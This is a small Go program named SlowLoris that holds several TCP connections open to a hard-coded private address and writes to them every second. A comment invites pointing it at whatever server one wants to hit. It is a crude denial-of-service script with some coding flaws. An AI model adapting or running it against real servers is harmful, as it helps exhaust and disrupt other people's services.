package main


import (
  "fmt"
  "net"
  "runtime"
	"strconv"
	"strings"
  "time"
  "sync"
)


func main() {


  host_addr := "172.30.5.220:45000"// replace this with whatever server you're trying to hit
  network := "tcp4"
  num_connections := 3
  seconds := 1
  var wg sync.WaitGroup
  for i := 0; i < num_connections; i++ {
    wg.Add(1)
    go SlowLoris(host_addr, network, seconds, &wg)

  }
  wg.Wait()


}


func SlowLoris(host_addr string, network string, seconds int, wg *sync.WaitGroup) {

  conn, err := net.Dial(network, host_addr)
  defer conn.Close()
  defer wg.Done()
  if err != nil {
    fmt.Println(err)
  }

  for {

    _, err := conn.Write([]byte(fmt.Sprintf("Alive... from %d", goid())))
    fmt.Printf("Wrote to socket in this goroutine, %d\n", goid())
    if err != nil {
      fmt.Println(err)
      return
    }

    time.Sleep(time.Duration(seconds) * time.Second)
  }
  fmt.Println("Done with goroutine.")

}


func goid() int {
	var buf [64]byte
	n := runtime.Stack(buf[:], false)
	idField := strings.Fields(strings.TrimPrefix(string(buf[:n]), "goroutine "))[0]
	id, err := strconv.Atoi(idField)
	if err != nil {
		panic(fmt.Sprintf("cannot get goroutine id: %v", err))
	}
	return id
}
